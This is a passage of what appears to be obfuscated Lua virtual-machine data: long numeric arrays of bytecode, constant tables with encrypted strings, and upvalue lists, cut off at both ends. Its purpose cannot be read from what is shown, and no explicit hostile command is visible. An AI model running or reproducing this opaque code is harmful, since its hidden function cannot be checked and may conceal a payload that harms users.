116,65,116,117,106,85,107,85,104,106,116,106,117,106,106,78,120,120,97,104,97,107,106,107,97,106,106,107,70,123,87,673,106,119,104,105,91,97,119,118,110,104,111,83,104,106,57,123,97,105,106,105,104,108,116,118,109,104,111,83,104,105,102,127,104,98,57,123,120,104,104,102,127,104,99,78,123,-1,64,123,75,106,105,104,96,106,104,104,113,83,102,124,103,107,87,286,59,123,102,125,107,92,87,278,59,123,102,114,75,106,105,104,97,104,104,75,106,105,104,102,104,103,75,106,105,104,100,113,75,106,105,104,101,106,119,75,102,115,106,105,104,98,57,120,59,123,104,90,104,125,99,104,91,103,107,87,477,59,123,106,104,104,113,83,102,124,103,87,461,102,112,106,105,104,105,102,113,57,121,59,123,95,461,106,105,104,88,102,126,75,102,118,106,105,106,104,104,113,83,102,124,103,107,87,427,59,123,104,89,107,92,87,419,59,123,104,94,104,91,106,104,104,113,83,102,124,103,107,87,400,59,123,102,119,107,92,87,392,59,123,102,116,118,95,104,92,83,104,93,83,57,127,97,110,106,110,104,108,118,109,104,111,83,104,104,102,127,104,82,57,123,104,105,104,104,57,126,75,106,110,104,83,118,109,104,111,83,104,104,102,127,104,80,57,123,104,104,104,104,57,126,75,106,110,104,81,118,95,104,81,83,104,86,83,75,102,118,106,105,106,104,104,87,83,104,84,106,104,104,113,83,102,124,103,107,87,559,59,123,102,119,107,92,87,551,59,123,102,113,118,95,104,92,83,104,85,83,57,127,97,111,106,111,104,108,118,109,104,111,83,104,105,102,127,104,74,57,123,120,104,105,104,104,57,126,75,106,111,104,83,118,109,104,111,83,104,104,102,127,104,75,57,123,104,104,104,104,57,126,75,106,104,104,113,83,97,108,106,105,104,72,83,107,104,73,83,105,66,123,57,120,59,123,106,105,104,78,83,107,104,73,83,105,66,120,57,120,59,123,106,105,104,79,83,107,104,73,83,105,66,121,57,120,59,123,85,105,85,110,85,111,85,108,95,383,102,126,104,76,118,109,104,111,83,104,104,104,104,104,104,106,119,102,127,104,77,57,123,73,102,127,104,66,57,123,91,57,126,75,102,104,104,102,104,67,106,119,79,75,88,122},P={{K={{116,14,206,117},{79,13,218,103},{119,36,252,35},{41,62,213,101,44,255,197},{80,0,201,113,34,242,136,86},{85,28,218,101,52,213,131},{6,81,246,104,48,189},{84,6,207,97,61,249},{91,6,220},{67,27,221,67,49},1,28,{206,247,100}},C={102,122,115,123,102,120,104,122,102,121,104,123,83,75,102,126,104,122,104,120,102,122,104,121,118,126,102,121,104,127,83,57,123,104,124,118,125,104,114,83,118,126,102,121,104,115,83,57,123,104,112,104,113,57,121,104,118,79,79,79,79,79,79,75,102,127,57,122,59,123,88,122},P={},U={{1,22},{0,6},{0,15},{1,18},{0,16},{0,17}},nParams=0},{K={7,49,{87,4,220},{97,15,218,111,40,232,138,69,21,162,82,51,203,157,79,187}},C={104,122,104,122,73,104,123,103,107,87,111,59,123,102,122,104,120,83,102,123,123,87,90,102,120,104,121,102,121,75,95,90,88,122},P={},U={{1,18},{0,6},{1,19},{0,7}},nParams=0},{K={1,2,{87,4,220},{97,15,218,111,40,232,138,69,21,162,82,51,203,157,79,187}},C={104,122,104,122,91,104,123,103,107,87,111,59,123,102,122,104,120,83,102,123,123,87,90,102,120,104,121,102,121,75,95,90,88,122},P={},U={{1,18},{0,6},{1,19},{0,8}},nParams=0}},U={{1,14},{1,10},{1,1},{1,101},{1,80},{1,22},{1,100},{1,27},{1,26},{1,36},{1,37},{1,34},{1,39},{1,30},{1,33},{1,82},{1,84},{1,103},{1,79}},nParams=0},{K={15,225,100,7,2,{113,21,215,99,33,243,149,70,41,167,67,50,200,151,90,195,187,83,31,215,111,47,242},{82,30,210,114,63,255,141,65},{87,30,220,107,54,215,141},{66,28,220,64,48}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,102,122,83,97,122,104,120,104,121,82,104,126,103,107,87,86,59,123,106,122,87,49,102,120,107,104,127,83,105,118,124,106,122,104,125,83,57,123,106,122,104,114,83,102,121,57,126,59,123,95,49,88,122},P={},U={{1,100},{1,101},{1,2},{1,7}},nParams=0},{K={12,144,3,2,9,{81,31,200,114,35,245,137,85},{76,30,222,78,54},{64,19,208,109},{98,28,220,64,48},{109,61,249,76,16,242,174,120,213,236,68,39,255,174,6,220},{127,6,165,43,6,212,128,91,162,185,119,67,227,156},{104,30,160,126,54,193,153,93,241},7,49,{126,11,173,98,59,215,137,107,231,163,104},{127,21,182,121,47,207,158,82},{115,61,180,112,49,194},{30,15,162,124,57},{70,28,186,116,59,221,161,86,238},{80,17,173,113},{71,11,184,124,14,204},{83,239,185,123,0,216},{90,238,175,118,14,141,155,126,233,184,73,10,128,66,53,239,181,84,14,177,123,62,205,219,28,217,184,126,19,208,114,56,180,200,2,59,173,110,57,207,190,85,229,182,127,23,158,184,46,240,174,70,17,201,109,33,148,133,91,28,171,121,64,217,203,34,172,182,76,9,152,96,116,206,133,70,14,131,127,41,229,153,85,235,182,53,74,251,139,36,245,177,69,28,164,89,57,206,152,103,227,191,108,65,130,204,109,133,179,67,80,201,38,37,244,130,92,93,186,61,29,239,134,94,231,176,29,40,240,115,45,250,135,3,22,166,121,113,129,137,22,160,182,55,67,215,213,109,209,155,90,18,211,108,122,222,132,82,236,174,101,73,156,219,103,235,244,19,71,153,97,33,254,239},{111},{97},{99},{87,228,164,115},{90,242,176,114,85},{112,232,189,118,62,214,157,61,251,173},{92,236,190,119,7,255,154,51},{106,217,244,76,47,251,84},{81,235,184,69},{127},{97,251,182,80,29,221,103}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,102,122,83,97,122,104,120,104,121,99,104,126,103,107,87,60,59,123,106,122,92,107,92,87,60,59,123,118,127,106,122,104,124,83,57,123,118,127,118,125,104,114,83,57,123,123,87,44,102,120,104,115,104,112,57,120,59,123,88,122,95,44,102,121,104,113,83,97,123,104,118,104,118,73,104,119,103,107,87,3,59,123,106,123,92,107,92,87,3,59,123,106,123,104,116,83,92,87,5,88,122,95,5,106,123,104,116,83,104,117,83,97,120,106,123,104,116,83,104,106,83,97,121,102,126,104,107,74,107,104,104,102,122,75,107,104,105,116,118,110,104,111,83,104,108,106,120,104,109,83,106,120,104,98,83,104,120,91,106,120,104,99,83,118,96,104,97,83,106,121,104,102,83,104,109,83,106,121,104,102,83,104,99,83,78,120,-1,64,123,75,107,104,103,102,127,75,57,120,59,123,102,120,104,100,106,122,104,101,83,107,92,87,139,59,123,104,90,104,91,79,57,120,59,123,88,122},P={},U={{1,100},{1,101},{1,23},{1,7},{1,13},{1,10}},nParams=0},{K={1,2,{13,30,221,109,42},{87,15,203,99,42,238,176,89,31},{71,0,222,96},{66,17,214,99,107,219,130,70,46,173,97,40,192,151,90,162,247,112,7,215,120,41,229,145,15,81,237,66,54,199,142,86,213,188,122,31,212,142,125,217,180,75,24,150,43,118,182},{71,21,209,110,60,214,141,74},{108,59,254,67,22,218},{70,18,211,108},{22}},C={104,122,104,122,91,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,120,74,107,104,121,102,122,75,107,104,126,104,127,75,107,104,124,102,120,75,57,120,59,123,102,121,104,125,102,126,102,122,83,107,87,61,59,123,102,126,102,122,83,104,114,83,107,92,87,53,59,123,104,115,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23},{1,101}},nParams=0},{K={15,225,{13,30,221,109,42},{87,15,203,99,42,238,176,89,31},{71,0,222,96},{82,24,210,106,52,188,147,64,8,173,51,58,198,212,83,229,182,65,7,150,117,113,236,159,13,30,172,124,121,205,210,11,169,225,126,81,145,152,40,178,169,115,26,227,52,47,226,202,80,238,175,54,4,194,147},{71,21,209,110,60,214,141,74},{100,32,252,91,27,190,186,113,49,158},{}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,120,74,107,104,121,102,122,75,107,104,126,104,127,75,107,104,124,102,120,75,57,120,59,123,102,121,104,125,104,114,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={100,7,2,{12,29,220,106,43},{80,14,200,98,53,239,179,88,24},{70,31,223,99},{74,30,223,102,62,189,132,67,67,174,117,50,207,207,7,238,162,114,9,197,116,36,251,134,6,91,148,99,59,220,149,73,245,243,53,73,254,146,43,242,178,121,24,222,115,48,210,225,90,238,175,118,14,141,141,42,253,228,67,14,215,96,106,220,131,69,47,162,96,43,193,144,91,161,246,74,25,208,114,2,248,145,89,3,145,104,42,213,135,90,225,237,51,111,220,148,37,240,176,7,21,200,97,110,242,153,14,40,171,124,20,237,153,51,207,191,75,1,220,43,108,201,136,78,3,160,98,28,211,152,30,174,216,113,7,208,159,37,180,176,70,17,253,108,35,200,214,113,235,163,124,37,199,139,55,251,153,77,25,215,98,121,190,184,109,46,234,58,126,192,146,31,229,185,68,75,194,105,41,249,194,66,20,167,52,29,193,156,78,247,191,98,78,152,220,34,252,185,34,31,209,106,53,243,202,67,240,246,97,14,222,156,49,253,185,64,11,151,71,58,232,151,85,21,178,82,61,202,151,79,233,253,72,0,209,136,58,250,146,95,37,168,118,50,168,129,87,224,175,117,68,194,149,39,173,174,79,2,146,83,61,232,139,91,59,167,117,61,198,144,36,171,183,79,8,151,108,34,236,195,91,16,183,33,23,202,133,72,227,148,114,6,208,145,45,247,254,70,6,151,124,37,142,179,10,185,252,39,66,194,138,99,248,169,10,54,134,48,96,171,207,59,16,168,113,60,196,211,77,238,233,86,4,198,116,42,248,130,73,89,172,104,47,139,204,106,231,189,127,0,222,188,51,248,254,14,82,206,111,125,208,136,89,26,247,55,63,244,165,99,172,164,69,67,234,102,61,252,144,96,20,150,96,58,209,159,1,225,179,113,27,214,222,58,243,241,99,18,174,100,36,196,171,66,235,132,118,16,203,141,121,251,168,80,21,155,117,54,178,189,123,19,172,118,38,235,145,87,235,163,73,4,196,60,9,249,151,64,86,153,71,55,192,138,66,199,181,115,7,199,149,40,224,243,123,26,220,101,61,241,141,21,243,172,56,49,205,133,39,227,172,30,9,204,109,69,246,138,83,26,170,49,53,202,149,0,193,189,109,29,213,145,41,240,206,69,19,182,36,117,235,128,89,228,171,85,5,205,159,41,178,242,6,24,209,96,124,206,129,73,27,244,65,27,195,152,114,165,184,68,27,159,51,97,168,207,31,85,244,38,122,204,157,92,168,147,125,4,217,154,58,252,171,71,16,252,101,57,207,153,5,188,143,120,14,194,138,112,160,183,65,24,146,53,124,171,202,1,85,231,123,48,207,221,124,232,183,116,13,199,111,62,248,133,120,5,163,99,43,211,143,75,225,161,121,28,141,203,102,248,177,64,92,231,65,61,250,140,76,66,243,44,89,161,159,44,235,249,113,14,217,111,43,205,157,95,31,248,125,52,196,209,93,233,182,61,45,221,139,36,186,140,73,20,172,110,2,216,156,82,172,139,113,23,142,150,54,175,159,75,5,214,40,2,255,134,94,24,156,106,46,204,218,108,254,167,69,31,213,105,108,254,143,74,86,138,99,56,195,138,110,247,177,117,21,193,157,53,247,179,75,10,131,57,116,246,135,82,174,155,119,19,201,153,54,176,171,68,100,213,107,44,251,137,16,36,162,44,21,201,129,73,233,189,125,12,154,145,47,226,200,9,50,164,111,54,206,207,17,163,145,125,74,251,159,61,228,174,84,20,129,37,32,255,144,82,13,186,113,43,195,145,122,164,249,16,85,128,48,127,169,218,30,75,243,45,122,204,157,92,168,152,113,6,213,152,117,204,186,7,32,218,114,33,213,153,83,161,147,115,88,233,157,48,250,171,75,22,146,44,90,242,128,17,17,168,112,125,220,155,91,231,244,107,11,198,107,101,229,145,77,0,172,37,62,214,128,90,240,166,117,11,152,210,102,247,179,85,82,212,53,98,178,219,4,95,174,122,64,194,155,38,162,135,77,30,209,119,39,246,138,18,47,129,121,54,148,223,82,226,165,53,88,159,147,40,224,183,4,7,161,101,50,206,129,31,175,252,42,79,159,203,109,163,234,9,29,218,114,57,178,149,83,19,172,124,51,129,217,14,184,249,17,89,159,40,108,227,131,94,19,237,121,56,205,155,18,181,254,43,82,152,220,34,252,185,8,26,211,110,122,207,133,70,233,191,127,14,194,202,23,201,177,78,92,151,106,42,237,205,0,87,246,61,108,139,194,20,168,182,112,13,157,223,47,251,132,33,2,160,127,60,140,137,93,239,175,96,76,157,212,112,188,189,83,31,223,115,59,242,134,27,87,195,120,48,201,148,44,171,162,86,81,208,99,32,253,217,105,28,176,92,63,215,134,82,229,180,52,69,230,138,45,246,176,122,17,205,124,60,195,142,20,168,246,84,16,200,153,55,235,241,77,2,221,41,4,236,131,84,18,142,124,59,199,221,80,236,163,55,90,155,54,98,186,154,101,26,163,106,61,247,156,88,234,188,106,4,194,158,40,242,165,26,67,145,74,50,253,130,83,13,165,96,14,207,162,51,237,185,81,29,217,113,43,247,135,86,71,244,109,114,172,133,75,189,130,113,9,202,214,96,180,171,93,91,131,100,59,209,128,82,246,168,124,89,237,150,42,225,191,70,4,147,96,36,242,132,70,20,167,125,118,128,212,76,237,239,100,14,197,117,62,248,155,5,81,227,107,55,192,198,48,224,190,127,79,187},{70,22,208,97,61,213,140,77},{98,38,243,89,7,220,171,103,197},{}},C={104,122,104,123,82,104,120,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,121,74,107,104,126,102,122,75,107,104,127,104,124,75,107,104,125,102,120,75,57,120,59,123,102,121,104,114,104,115,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={12,144,3,2,9,{113,21,195,114},{117,33,229,39,17,213,169,103},{101,19,222,99,52,236,134,65,17,174,86,15,199,153,51,191},{107,28,210,102,38,172},{79,6,208,103,7,231,169},20,70,{127,39,155},{126,44,140,94,9,225,171},{125,45,139,95,122,246,160,98},{0,9,160,126,63},{68,26,180,118,57,211,167,84,236},{82,19,163,119},{65,9,186,122,48,206},{85,17,187,121,62,222},{88,16,169,116,12,139,158,50,177,176,67,0,221,57,9,252,144,124,31,183,102,50,197,148,20,165,154,105,28,195,173,44,230,169,67,22,165,41,127,129,128,88,225,172,116,67,194,137,121,232,187,72,21,129,65,52,232,180,87,15,190,122,61,204,220,29,218,185,65,18,211,115,63,181,203,3,52,172,109,56,200,191,86,228,169,126,20,187,144,40,241,188,68,83,216,124,58,252,158,92,239,165,54,19,132,152,107,173,177,69,78,202,125,33,186,132,94,31,230,98,37,201,220,79,237,162,107,12,199,139,106,225,136,78,24,225,126,50,214,152,74,237,238,106,29,193,212,55,245,170,83,20,207,115,122,242,193,19,27,165,103,58,195,147,96,227,162,85,28,232,112,40,233,150,75,10,176,47,46,205,149,85,166,163,121,19,199,143,38,179,182,93,0,207,85,39,197,154,67,228,191,99,74,194,209,99,235,181,87,10,211,99,112,233,131,64,9,162,97,41,136,135,86,236,186,63,24,208,116,62,228,143,12,5,167,124,45,198,157,77,172,160,51,69,213,149,34,177,185,73,22,183,100,35,176,170,92,30,190,97,5,207,204,2,227,185,76,8,219,119,102,255,145,65,25,177,121,52,200,217,81,244,181,52,98,195,157,40,248,179,2,7,236,112,3,211,128,10,160,232,107,76,194,150,35,173,246,104,21,207,110,62,248,218,16,45,135,64,10,139,216,119,239,180,68,14,196,114,113,236,185,15,59,172,96,45,193,129,78,168,132,98,22,212,222,26,175,255,73,3,206,101,61,252,139,65,233,164,120,78,198,132,45,227,250,94,66,251,107,43,227,216,88,8,252,91,15,232,188,120,230,176,113,13,209,215,49,224,137,79,75,181,99,36,214,159,81,237,169,49,8,223,212,16,227,190,84,56,216,46,126,243,137,94,27,244,120,47,132,187,33,230,179,13,28,197,103,112,186,128,70,24,176,45,118,200,131,92,187,188,111,0,158,156,44,254,183,71,63,218,115,104,130,206,69,163,177,62,31,132,242,38,224,189,13,101},{84,228,166,127,15,231,146,59},{101,209,149,55,35,238,172,10,216,156},{89,227,160,125},{7}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,104,120,104,121,99,104,126,103,107,87,82,59,123,102,123,102,122,83,87,45,102,123,102,122,113,75,102,120,104,127,104,124,75,102,120,104,125,118,114,104,115,83,104,112,104,112,104,113,57,121,75,102,121,104,118,104,119,57,120,59,123,88,122,95,45,102,123,102,122,122,75,102,120,104,127,104,116,75,102,120,104,125,102,126,75,102,127,104,117,74,107,104,106,102,122,75,107,104,107,118,104,104,105,83,104,110,102,124,102,125,57,121,75,107,104,111,102,125,75,57,120,59,123,102,121,104,108,102,114,102,122,83,107,87,221,59,123,102,114,102,122,83,104,109,83,107,92,87,213,59,123,104,98,57,120,59,123,88,122},P={},U={{1,100},{1,102},{1,94},{1,23},{1,31},{1,13},{1,9},{1,10},{1,101}},nParams=0},{K={7,49,{13,30,221,109,42},{87,15,203,99,42,238,176,89,31},{71,0,222,96},{73,31,216,103,61,188,132,15,26,169,126,59,147,179,90,254,134,69,25,192,104,47,242,202,15,40,175,111,32,193,157,73,167,249,53,42,222,159,38,254,141,68,18,199,108,38,177,169,93,225,185,119,2,216,146,48,173,180,76,13,216,104,111,232,216,83,91,167,127,56,135,145,7,206,186,112,13,242,150,56,230,148,104,30,168,96,51,138,207,112,246,163,120,10,192,147,33,194,180,73,5,236,102,32,233,202,26,94,160,114,127,216,213,52,227,179,79,76,197,44,12,246,128,70,22,182,106,62,152,158,84,242,241,110,73,243,147,43,251,177,91,17,219,42,48,206,143},{71,21,209,110,60,214,141,74},{97,32,248,77,9,219},{124,60,249,78,24,218,174}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,120,74,107,104,121,102,122,75,107,104,126,104,127,75,107,104,124,102,120,75,57,120,59,123,102,121,104,125,104,114,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={1,2,{13,30,221,109,42},{87,15,203,99,42,238,176,89,31},{71,0,222,96},{73,31,216,103,61,188,139,66,64,175,114,51,204,206,120,239,161,115,14,196,119,37,244,135,5,90,147,98,56,221,138,72,246,242,50,72,253,147,36,243,177,120,31,223,112,49,237,202,65,225,184,125,79,223,135,35,250,182,11,8,204,106,44,238,140,95,21,238,56,124,208,154,84,228,182,62,29,213,140,33,187,151,74,31,181,36,103,140,220,17,163,170,118,68,195,149,38,241,183,6,25,129,107,34,179,171,91,31,187,117,60,222,144,50,171,183,79,8,151,110,61,182,160,70,24,182,110,57,209,149,73,188,151,117,9,214,187,33,225,173,93,55,215,99,57,196,164,80,194,160,118,17,222,208,97,198,172,73,14,212,106,57,255,196,24,92,174,116,125,192,211,74,225,177,113,74,221,46,3,243,128,64,3,170,48,104,131,139,87,224,239,127,11,212,219,35,255,184,14},{71,21,209,110,60,214,141,74},{107,61,242,88,115,213,160,120,51},{105,48,234,64,2,218}},C={104,122,104,122,91,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,120,74,107,104,121,102,122,75,107,104,126,104,127,75,107,104,124,102,120,75,57,120,59,123,102,121,104,125,104,114,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={15,225,100,7,2,12,144,{84,23,201,107,63,247,153,86,16,171,103,4},{88,16,223,101,56},{67,27,221,67,49},{96,58,130,66,18},{95,25,178,120,37,203,131,95}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,102,122,83,97,122,104,120,104,121,82,104,126,103,107,87,86,59,123,106,122,87,25,104,127,104,127,73,104,124,103,107,87,71,59,123,118,125,87,52,118,114,118,125,106,122,104,115,83,57,120,59,123,95,52,116,102,120,104,112,118,113,106,122,104,115,83,78,123,-1,64,123,59,123,95,25,88,122},P={},U={{1,100},{1,101},{1,23}},nParams=0},{K={3,2,9,{12,29,220,106,43},{80,14,200,98,53,239,179,88,24},{70,31,223,99},{121,46,247,78,30,209,188,123,44,140,85,27,249,170,31},{70,22,208,97,61,213,140,77},{99,58,242,69,116,203,162,103,197,138,82,50},{122,49,241,94}},C={104,122,104,123,99,104,120,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,121,74,107,104,126,102,122,75,107,104,127,104,124,75,107,104,125,102,120,75,57,120,59,123,102,121,104,114,104,115,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={7,49,{13,30,221,109,42},{87,15,203,99,42,238,176,89,31},{71,0,222,96},{73,31,216,103,61,188,174,118,64,241,37,107,153,193,7,178,236,21,82,132,52,127,165,232,75,23,177,46,48,136,153,26,236,190,59,22,208,149,53,225,245,79,18,211,108,122,200,133,71,235,184,102,0,207,146,120,202,189,87,45,209,109,35,254,151,85,21,238,56,117,135,150,82,130,186,120,73,194,197,3,230,161,3,84,145,109,37,214,207,17,163,186,113,1,193,240,41,255,184,71,29,156,99,99,160,161,93,13,189,117,49,201,144,110,229,179,86,68,149,70,40,251,130,66,91,237,47,62,148,222,111,227,169,104,18,192,152,117,177,172,75,12,222,121,38,197,159,95,229,246,56,77,143,214,109,199,157,4,11,139,43,22,250,133,84,65,229,84,47,199,157,74,171,244,123,91,155,80,42,228,132,66,3,255,123,82,207,129,90,229,163,58,1,130,198,15,255,175,83,19,211,107,54,176,135,81,8,226,55,36,206,149,32,224,245,11,77,220,49,96,205,129,87,14,176,98,62,155,211,78,229,170,124,27,192,155,61,253,187,16,90,239,41,120,143,165,115,162,169,42,77,232,152,39,234,231,7,36,212,118,115,188,131,0,83,152,114,44,204,154,75,183,163,42,7,217,98,45,251,194,73,75,254,71,55,215,155,91,235,179,126,72,223,153,48,186,255,108,22,221,104,56,189,195,21,228,248,56,53,201,143,54,248,170,70,83,155,118,45,226,132,67,8,163,101,53,195,200,18,167,241,48,71,253,187,106,241,211,5,48,160,111,50,159,207,116,230,168,109,70,143,158,118,190,139,71,3,217,105,38,160,158,57,18,166,119,62,198,213,36,191,235,104,2,196,118,44,246,128,75,87,170,106,45,141,210,127,227,178,125,11,144,212,104,247,234,7,32,218,114,33,213,153,83,188,238,101,0,213,153,48,253,188,80,6,222,63,127,180,196,31,82,142,86,125,204,199,16,207,181,124,15,136,34,25,255,134,68,3,224,45,60,151,192,105,229,189,127,11,196,198,48,155,176,72,17,220,100,115,250,220,9,54,164,102,20,202,152,34,233,249,76,8,207,43,108,221,129,76,27,169,50,114,134,149,9,169,134,120,16,199,139,59,241,226,8,7,162,115,55,210,159,82,246,164,124,89,129,214,102,161,244,108,52,155,98,100,178,161,83,30,173,46,124,235,155,75,254,186,77,73,150,101,121,185,178,76,10,166,96,45,153,153,48,233,191,120,7,221,220,35,164,224,97,29,205,125,53,241,137,80,174,165,115,22,132,213,6,232,187,66,2,155,45,111,254,211,30,47,163,105,40,210,128,88,181,241,108,11,204,158,57,230,133,95,31,165,54,120,141,207,22,173,135,93,68,203,204,107,214,186,69,20,129,37,16,252,139,88,92,233,112,105,132,165,33,249,179,79,24,138,116,71,253,141,74,115,161,97,62,175,150,84,244,241,117,75,196,221,33,253,254,89,21,214,120,38,136,140,87,236,169,57,53,194,138,40,253,169,69,12,223,63,23,254,146,114,20,174,126,57,218,150,80,161,253,54,74,209,111,65,255,135,12,1,248,68,43,226,198,27,201,160,126,0,220,217,111,177,168,79,23,211,2,53,241,155,20,22,230,111,64,194,152,97,252,182,75,31,203,43,56,163,163,74,14,134,120,50,202,149,78,226,188,53,65,154,222,45,251,213,67,19,224,113,108,232,159,118,170,239,72,2,220,141,102,166,250,81,24,222,104,91,240,136,81,28,164,51,58,152,201,118,228,166,84,10,216,98,41,185,140,72,15,235,44,29,193,140,91,233,242,50,70,213,205,105,198,184,80,7,203,123,49,162,200,71,226,179,119,18,223,146,54,228,188,25,65,150,38,97,180,172,116,91,162,32,114,225,147,94,237,238,60,47,198,144,36,225,194,11,18,240,34,7,195,159,93,237,186,36,30,165,150,42,243,186,74,81,216,53,111,212,134,64,10,168,122,60,207,219,46,238,161,9,78,243,103,46,249,143,12,80,228,107,104,139,164,94,254,165,105,21,215,192,106,225,188,81,21,204,121,48,212,130,82,187,227,56,64,131,214,10,202,249,64,93,148,67,49,248,131,12,94,147,125,45,138,211,90,187,250,79,11,199,101,37,226,220,86,125,174,98,59,194,130,25,224,252,39,44,222,136,50,240,178,68,23,147,102,54,233,193,22,59,175,118,1,199,212,104,172,179,17,67,236,102,54,237,145,93,31,248,50,41,196,137,93,244,161,120,28,218,154,115,187,240,8,91,238,66,18,129,136,4,172,139,121,0,203,196,102,195,191,67,4,153,38,53,175,201,98,28,186,118,48,221,201,69,128,185,79,8,215,109,108,243,214,16,49,173,125,45,197,129,89,224,254,117,3,198,212,101,214,184,75,18,210,43,125,191,142,1,174,159,115,25,216,130,48,232,229,1,28,219,124,46,233,150,85,15,175,117,102,136,221,31,166,253,87,45,148,155,126,187,166,74,21,164,49,117,240,132,95,235,186,59,68,203,206,107,192,186,84,20,210,115,111,231,226,95,17,170,117,51,138,145,117,182,159,79,31,195,99,35,251,134,0,23,161,120,114,135,180,94,229,176,112,69,155,221,44,166,240,125,17,199,126,32,210,142,11,163,190,117,26,204,139,48,235,173,77,11,128,42,127,185,200,31,53,131,50,57,157,221,120,232,183,122,87,151,66,36,226,149,67,26,224,45,60,150,192,105,229,189,127,11,196,198,60,155,176,72,17,220,100,115,250,223,9,54,164,102,20,202,152,34,233,249,76,8,207,43,108,221,129,76,27,169,50,114,134,149,10,169,134,120,16,199,139,59,241,226,8,7,162,115,55,210,159,82,246,164,124,89,129,214,102,161,244,108,52,155,98,103,178,161,83,30,173,46,124,235,149,92,225,247,0,15,128,47,28,246,144,72,22,183,51,35,174,138,84,225,218,126,8,213,246,34,252,185,34,22,208,109,94,243,133,86,225,167,54,18,199,142,127,196,182,80,26,216,106,44,255,203,94,30,177,57,126,244,153,68,170,250,62,26,223,134,100,197,129,89,19,175,120,106,197,140,85,230,224,85,13,200,146,49,249,181,65,123,207,108,43,179,187,88,7,171,123,39,232,158,125,169,164,67,20,214,113,62,253,151,71,29,254,32,117,135,222,21,207,149,60,20,217,132,102,192,181,80,22,208,114,17,206,214,20,243,174,111,3,222,139,38,250,176,64,85,149,42,114,181,200,120,56,205,97,54,209,221,109,226,173,125,5,205,70,63,171,195,94,21,186,108,43,208,139,77,237,171,32,74,159,217,104,191,149,99,82,206,99,42,176,186,95,6,168,122,24,231,144,124,174,165,64,21,217,112,61,252,144,70,30,255,63,116,132,223,18,206,150,23,27,216,135,103,199,180,83,23,175,115,4,213,209,21,240,175,96,2,221,138,33,251,179,65,74,148,41,115,178,201,123,57,232,96,53,208,218,108,225,172,66,4,206,84,60,170,192,95,26,187,111,42,215,138,78,236,180,33,73,158,222,105,188,148,108,121,216,102,38,191,131,25,246,235,127,15,140,135,35,228,170,80,70,222,101,34,255,203,103,20,180,122,47,215,147,94,237,233,89,12,192,188,34,252,140,79,4,164,98,127,139,196,24,231,161,19,13,201,218,51,170,146,85,48,148,37,2,252,154,71,92,224,52,43,194,144,46,129,186,78,15,214,110,109,232,222,103,23,183,123,59,203,147,94,168,191,121,16,154,223,24,242,172,93,29,220,102,48,229,134,95,245,184,114,16,143,209,99,254,247,112,10,194,113,37,233,131,12,94,181,112,37,201,128,77,236,160,118,14,143,47,100,180,207,2,62,134,45,40,141,188,88,240,170,39,87,128,203,102,225,242,119,19,207,109,61,234,212,66,117,172,122,18,139,159,109,244,247,75,3,152,115,47,240,150,92,82,162,113,54,195,223,107,232,160,118,27,195,159,42,241,229,109,16,180,72,62,200,128,83,240,168,118,75,135,208,100,235,181,47,25,221,38,41,166,174,65,60,224,49,19,198,144,90,230,247,9,75,194,105,41,249,232,75,23,177,46,48,136,149,26,236,190,59,22,208,149,53,225,245,80,73,249,108,32,220,130,92,236,175,100,4,194,223,107,164,248,71,1,179,109,41,186,159,10,50,181,80,116,133,162,92,250,167,60,64,148,139,34,240,142,33,26,174,111,54,206,205,72,177,243,80,10,220,142,36,254,184,67,95,210,98,37,181,202,99,31,187,96,54,201,153,37,206,187,72,24,195,103,63,186,202,14,9,246,33,14,192,136,79,243,163,121,90,144,143,42,235,191,90,7,218,126,60,196,209,25,174,238,57,76,228,188,99,254,235,10,61,219,113,53,166,212,1,76,231,98,111,134,163,95,251,177,113,30,136,122,65,243,143,72,125,167,99,60,169,139,87,224,197,127,11,212,241,35,255,184,45,23,211,108,89},{71,21,209,110,60,214,141,74},{106,55,157,91,3,223,164},{123,54,240,93}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,102,123,104,120,74,107,104,121,102,122,75,107,104,126,104,127,75,107,104,124,102,120,75,57,120,59,123,102,121,104,125,104,114,57,120,59,123,88,122},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={1,2,{86,2,203,119,60,240,138,72},{68,15,212,97},{116,3,219,102,53,210,130},{111,31,217,79,53},{85,5,206,110,60,250},{65,29,207,101,50,234},{68,28,221,104,56,191,184,112,204,138,79,92,142,210,49,175,248,79,1,218,101,35,186,174,117,34,251,51,121,212,208,55,228,188,125,8,216,223,34,230,221,76,23,172,105,109,229,136,76,208,171,107,18,198,153,32,184,249,110,5,200,119,1,248,154,69,23,170,113,125,131,213,44,228,181,64,0,151,110,61,165,132,79,20,161,53,29,192,132,104,227,163,106,14,209,152,96,177,142,69,21,198,111,39,211,201,31,175,128,120,1,204,148,19,226,184,93,10,200,37,60,244,133,80,16,231,126,46,149,148,95,228,177,37,45,208,116,24,243,147,90,30,161,104,112,129,162,86,227,156,127,23,198,146,37,244,254,14,120,209,103,48,255,133,20,25,191,123,3,223,159,46,226,247,80,69,215,42,110,240,130,15,9,188,126,123,199,159,88,167,161,100,6,157,140,44,229,170,79,6,180,43,34,201,137,89,162,191,125,23,219,139,42,175,169,92,30,149,116,52,237,146,87,14,188,59,49,128,212,90,230,166,69,2,208,33,36,227,150,93,39,177,107,40,209,138,73,241,240,111,14,